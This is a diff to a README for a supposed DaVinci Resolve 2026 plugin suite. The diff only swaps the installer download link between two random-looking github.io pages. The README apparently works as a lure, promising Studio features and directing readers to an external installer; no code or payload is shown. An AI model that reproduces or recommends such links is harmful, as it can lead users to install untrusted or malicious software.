@@ -2,7 +2,7 @@
 
 This repository provides a comprehensive package for DaVinci Resolve 2026, including studio plugins, color presets, fusion effects, and audio tools. Designed for Windows 10 and 11 desktop users, it enhances your video editing workflow with professional-grade features without the need for unauthorized cracks or hacks.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -57,7 +57,7 @@ A: Future updates will be available on the same download page. Simply download a
 
 To access the latest version of the DaVinci Resolve Studio Plugin Suite, use the link below:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 *Last Updated: December 2026. For any additional help, refer to the FAQ section or community forums.*
 
